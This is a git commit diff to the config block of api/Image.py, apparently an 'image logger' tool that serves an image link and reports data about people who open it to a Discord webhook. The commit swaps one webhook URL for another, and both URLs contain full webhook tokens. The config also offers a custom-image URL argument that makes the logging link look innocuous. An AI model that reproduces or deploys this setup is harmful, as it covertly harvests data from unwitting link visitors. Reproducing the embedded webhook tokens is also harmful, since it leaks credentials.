857c992a538e9654ea9cf712cb432de2c6e2f4b4
zact0s <q3gdas@gmail.com>
2025-06-15 01:32:13 +1000

    Update Image.py

--- api/Image.py
+++ api/Image.py
@@ -12,7 +12,7 @@ __author__ = "Dexty"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1383420795220394065/NIkFl-Gc-XV-hO-3nBiyzLHk_cf8OqSGQBGdGK1vYviZMNr4sz_SeOo9fY3q1qwbF3s7",
+    "webhook": "https://discord.com/api/webhooks/1383468896341852200/w9qEF-gV8-e4G2w4o_3dig_Skx7xEQI_ikg_hSxX4xx5v-i3QujObMQJ3cuCg95RWd_y",
     "image": "https://pbs.twimg.com/profile_images/1284155869060571136/UpanAYid_400x400.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
